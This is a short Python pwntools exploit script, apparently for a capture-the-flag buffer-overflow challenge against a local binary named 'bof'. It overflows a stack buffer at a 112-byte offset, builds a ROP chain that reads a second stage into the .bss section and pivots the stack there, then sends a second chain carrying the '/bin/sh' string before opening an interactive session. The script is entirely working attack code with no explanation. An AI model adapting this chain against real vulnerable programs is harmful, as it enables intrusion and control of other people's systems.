#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = "debug"

io = process("./bof")
elf = ELF("./bof")
rop = ROP("./bof")

offset = 112
base = elf.bss() + 0x800

rop.raw('a' * offset)
rop.read(0, base, 0x100)
rop.migrate(base)

io.sendlineafter("!\n", rop.chain())

rop = ROP("./bof")

cmd = "/bin/sh\0"
rop.write(1, base + 0x80, len(cmd))
rop.raw('a' * (0x80 - len(rop.chain())))
rop.raw(cmd)
rop.raw('a' * (0x100 - len(rop.chain())))

io.sendline(rop.chain())

io.interactive()
io.close()
